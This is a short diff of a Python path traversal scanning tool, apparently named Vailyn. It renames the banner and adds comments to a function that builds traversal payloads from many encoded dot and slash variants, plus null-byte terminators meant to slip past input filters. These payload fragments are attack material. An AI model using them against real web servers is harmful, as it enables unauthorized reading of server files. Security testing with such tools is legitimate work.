@@ -13,7 +13,7 @@ _____, ___
       ,   
        
 
-┌─[pathtrav]─[~]
+┌─[Vailyn]─[~]
 └──╼ VainlyStrain
 """
 
@@ -21,6 +21,7 @@ import multiprocessing
 import sys, os
 
 
+"""generate payload list from a variety of dots and slashes"""
 def generatePayloads():
     dots = ['..', '. . ', '%2e%2e', '0x2e0x2e', '%252e%252e', '..;', '%c0%2e%c0%2e', '%e0%80%ae%e0%80%ae', '%c0%ae%c0%ae', '%25c0%25ae%25c0%25ae', 
         '%%32%65%%32%65', '%uff0e%uff0e', '%e0%ae%e0%ae', '%u002e%u002e', '%25%32%65%25%32%65', '%%c0%6e%c0%6e', '%c0%5e%c0%5e',
@@ -40,12 +41,16 @@ def generatePayloads():
 
 
 payloadlist = generatePayloads()
+#special not in use
 special = ['.?/','?./','??/']
 nullchars = ['%00', '%2500', '%25%30%30', '%u0000', '%c0%80', '%e0%80']
 sdirs = ['']
 commons = []
 
+#clear the terminal, supports both Windows and Unix-like
 CLEAR_CMD = "cls" if sys.platform.lower().startswith("win") else "clear"
+
+#set maximal amount of processes
 processes = multiprocessing.cpu_count()
 
 if sys.platform.lower().startswith('win'):
